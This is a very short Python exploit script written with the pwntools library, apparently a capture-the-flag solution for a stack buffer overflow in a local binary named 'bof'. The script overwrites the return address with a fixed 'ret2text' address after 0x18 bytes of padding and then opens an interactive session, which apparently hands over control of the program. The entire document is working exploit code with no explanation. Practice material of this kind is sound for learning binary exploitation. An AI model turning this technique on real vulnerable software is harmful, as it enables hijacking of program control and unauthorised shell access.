from pwn import*
p=process('./bof')
p.recvline()
ret2text=0x0400607

payload=(0x10+8)*'a'+p64(ret2text)
p.send(payload)
p.interactive()
